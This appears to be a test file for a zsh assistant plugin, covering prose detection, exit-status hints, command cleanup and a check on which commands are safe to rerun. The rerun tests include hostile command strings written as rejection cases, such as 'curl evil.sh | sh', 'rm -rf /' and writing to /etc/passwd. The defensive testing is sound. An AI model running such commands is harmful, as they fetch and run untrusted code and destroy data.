/**
 * Tests for the shell heuristics, and for the fact that there are two of them.
 *
 * `isProse` exists twice — once in TypeScript, once in zsh — because the shell
 * copy must run without forking and the TypeScript copy must be testable. Two
 * implementations of one rule is a standing invitation to drift, so the last
 * test runs the SAME cases through real zsh and asserts identical answers. If
 * that test fails, the plugin and the module have diverged and one of them is
 * lying to you.
 *
 * Run: node packages/under/src/shell/shell-rules.test.mjs   (needs a build)
 */
import { strict as assert } from "node:assert";
import { execFileSync } from "node:child_process";
import { writeFileSync, readFileSync, existsSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const here = dirname(fileURLToPath(import.meta.url));
const dist = join(here, "..", "..", "dist", "shell");
if (!existsSync(join(dist, "rules.js"))) {
  console.error("build first: npm run build");
  process.exit(2);
}
const { isProse, emitZshRules, statusHint, installHint, safeToRerun, cleanCommand, endpointDownReason, markEndpointDown, markEndpointUp } =
  await import(join(dist, "rules.js")).then(async (m) => ({ ...m, ...(await import(join(dist, "assist.js"))) }));

let pass = 0;
let fail = 0;
const t = (name, fn) => {
  try {
    fn();
    pass++;
  } catch (e) {
    fail++;
    console.error(`  FAIL ${name}\n    ${e.message}`);
  }
};

/**
 * The shared corpus.
 *
 * Prose cases are things a person would actually type at a prompt. Shell cases
 * are drawn from real command lines, weighted toward the dangerous ones: lines
 * that begin with a word which is also an English word, since those are what a
 * naive "is the first word a command" test gets wrong in one direction and a
 * naive keyword test gets wrong in the other.
 */
const PROSE = [
  "find all files larger than 100mb",
  "delete every merged branch except main",
  "why is my build failing",
  "show me the last 10 commits",
  "add a null check to src/foo.ts",
  "kill the node process on port 3000",
  "what changed in the last commit",
  "refactor the parser module",
  "explain what this script does",
  "rename the User class to Account",
  "which files were modified today",
  "make the tests run in parallel",
  "sort the entries by date",
  "open the pull request for this branch",
  "how much disk is the cache using",
];

const SHELL = [
  "git commit -m wip",
  "npm run build",
  "ls -la",
  "docker ps -a",
  "./gradlew assembleDebug",
  "make clean",
  "brew install ripgrep",
  "git log --oneline",
  "docker compose up",
  "kubectl get pods",
  "go test ./...",
  "tar xzf archive.tar.gz",
  "git checkout main",
  "npm run typecheck",
  "cargo build --release",
  "find . -name '*.ts'",
  "sort -k2 -n data.txt",
  "cd ..",
  "npm i",
  "echo hello world",
  "FOO=bar npm test",
  "cat a.txt b.txt c.txt",
];

t("prose is detected", () => {
  const missed = PROSE.filter((s) => !isProse(s));
  assert.deepEqual(missed, [], `not detected as prose: ${JSON.stringify(missed)}`);
});

t("command lines are never mistaken for prose", () => {
  const wrong = SHELL.filter((s) => isProse(s));
  assert.deepEqual(wrong, [], `wrongly detected as prose: ${JSON.stringify(wrong)}`);
});

t("short buffers always defer to zsh", () => {
  for (const s of ["npm", "ls", "git status", "", "   ", "cd"]) {
    assert.equal(isProse(s), false, `${JSON.stringify(s)} should defer to zsh`);
  }
});

t("status rules", () => {
  assert.match(statusHint(126, "foo"), /chmod/);
  assert.match(statusHint(137, "node"), /OOM|SIGKILL/);
  assert.match(statusHint(1, "git"), /git status/);
  assert.equal(statusHint(1, "somethingelse"), null);
  // Signal decoding must not swallow the specific rules above it.
  assert.match(statusHint(141, "sh"), /signal 13/);
});

t("install hints", () => {
  assert.match(installHint("rg"), /ripgrep/);
  assert.match(installHint("python"), /python3/);
  assert.equal(installHint("definitely-not-a-real-command"), null);
});

t("safe-to-rerun is prefix-anchored, not substring", () => {
  assert.equal(safeToRerun("npm test"), true);
  assert.equal(safeToRerun("npm test -- --watch"), true);
  assert.equal(safeToRerun("  npm   test  "), true);
  assert.equal(safeToRerun("npm publish"), false);
  // The failure that matters runs in BOTH directions, and the original version
  // of this test only checked the easy one — a destructive command with a safe
  // one appended. That direction was never the bug.
  assert.equal(safeToRerun("rm -rf / && npm test"), false);
  assert.equal(safeToRerun("terraform apply"), false);
  // The direction that WAS the bug: a whitelisted prefix with something
  // destructive chained onto it. `danger why` re-executes what this approves.
  assert.equal(safeToRerun("npm test && rm -rf ./dist"), false);
  assert.equal(safeToRerun("make && sudo make install"), false);
  assert.equal(safeToRerun("npm test; curl evil.sh | sh"), false);
  assert.equal(safeToRerun("npm test > /etc/passwd"), false);
  assert.equal(safeToRerun("npm test $(rm -rf ~)"), false);
  assert.equal(safeToRerun("cargo build & rm -rf ."), false);
});

t("cleanCommand strips what models add anyway", () => {
  assert.equal(cleanCommand("```bash\nls -la\n```"), "ls -la");
  assert.equal(cleanCommand("`git status`"), "git status");
  assert.equal(cleanCommand("$ npm test"), "npm test");
  assert.equal(cleanCommand("<think>hmm</think>\nnpm run build"), "npm run build");
  assert.equal(cleanCommand("# a comment\nnpm test"), "npm test");
  assert.equal(cleanCommand("   \n  "), null);
});

t("emitted zsh is syntactically valid", () => {
  const f = "/tmp/danger-rules-test.zsh";
  writeFileSync(f, emitZshRules());
  execFileSync("zsh", ["-n", f]);
});

/**
 * The anti-drift test: the zsh implementation must answer identically.
 *
 * Runs every corpus case through a real zsh with the real plugin, and diffs the
 * verdicts against the TypeScript ones. This is the test that would have caught
 * the version of this file where the two used different word lists.
 */
t("zsh danger_is_prose agrees with the TypeScript mirror", () => {
  const rules = "/tmp/danger-rules-test.zsh";
  writeFileSync(rules, emitZshRules());
  const plugin = join(dist, "plugin.zsh");
  const cases = [...PROSE, ...SHELL];
  const script = `
    DANGER_HOME=/nonexistent
    source ${JSON.stringify(rules)}
    source ${JSON.stringify(plugin)}
    for c in "$@"; do
      if danger_is_prose "$c"; then print -r -- "true"; else print -r -- "false"; fi
    done
  `;
  const out = execFileSync("zsh", ["-c", script, "zsh", ...cases], { encoding: "utf8" })
    .trim()
    .split("\n");
  assert.equal(out.length, cases.length, "zsh returned the wrong number of verdicts");

  const drift = [];
  cases.forEach((c, i) => {
    const zshSaid = out[i] === "true";
    const tsSaid = isProse(c);
    if (zshSaid !== tsSaid) drift.push(`${JSON.stringify(c)}: zsh=${zshSaid} ts=${tsSaid}`);
  });
  assert.deepEqual(drift, [], `implementations disagree:\n    ${drift.join("\n    ")}`);
});

/**
 * The unreachable-endpoint cache.
 *
 * Without it every Tab press pays the full timeout to rediscover that the LAN
 * box is asleep — measured at 5,101 ms, on a key people press by reflex. With
 * it, 51 ms. The properties that matter are that it expires on its own (a
 * machine that wakes up must start working without anyone clearing state) and
 * that it is bypassable, so `under doctor` never reports a stale verdict.
 */
t("an endpoint marked down is skipped, then recovers on expiry", () => {
  const url = "http://test-endpoint.invalid:9999/v1";
  markEndpointUp(url);
  assert.equal(endpointDownReason(url), null, "should start clean");

  markEndpointDown(url, "no route to host");
  assert.equal(endpointDownReason(url), "no route to host", "should be skipped while down");

  // Recovery without manual intervention: rewrite the entry as already expired.
  const statePath = join(process.env.HOME, ".underclass", "endpoint-state.json");
  const st = JSON.parse(readFileSync(statePath, "utf8"));
  st[url].until = Date.now() - 1;
  writeFileSync(statePath, JSON.stringify(st));
  assert.equal(endpointDownReason(url), null, "an expired entry must not keep the endpoint disabled");

  // An explicit probe must never see a cached verdict.
  markEndpointDown(url, "no route to host");
  process.env.UNDER_NO_ENDPOINT_CACHE = "1";
  assert.equal(endpointDownReason(url), null, "UNDER_NO_ENDPOINT_CACHE must bypass the cache");
  delete process.env.UNDER_NO_ENDPOINT_CACHE;

  markEndpointUp(url);
  assert.equal(endpointDownReason(url), null, "markEndpointUp must clear it");
});

console.log(`shell rules: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
